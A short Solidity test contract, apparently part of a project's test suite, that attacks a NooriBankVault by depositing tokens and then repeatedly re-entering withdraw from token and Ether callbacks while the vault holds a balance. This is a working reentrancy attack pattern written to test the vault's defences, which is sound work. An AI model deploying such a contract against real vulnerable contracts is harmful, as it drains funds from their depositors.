// contracts/test/ReentrancyAttacker.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../vault/NooriVault.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttacker {
    NooriBankVault public vault;
    IERC20 public token;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = NooriBankVault(_vault);
        token = IERC20(vault.asset());
    }

    function attack() external {
        attackAmount = token.balanceOf(address(this));
        token.approve(address(vault), attackAmount);
        vault.deposit(attackAmount);
        vault.withdraw(attackAmount);
    }

    function onERC20Received(address, uint256 amount) external returns (bool) {
        if (token.balanceOf(address(vault)) > 0) {
            vault.withdraw(amount);
        }
        return true;
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(attackAmount);
        }
    }
}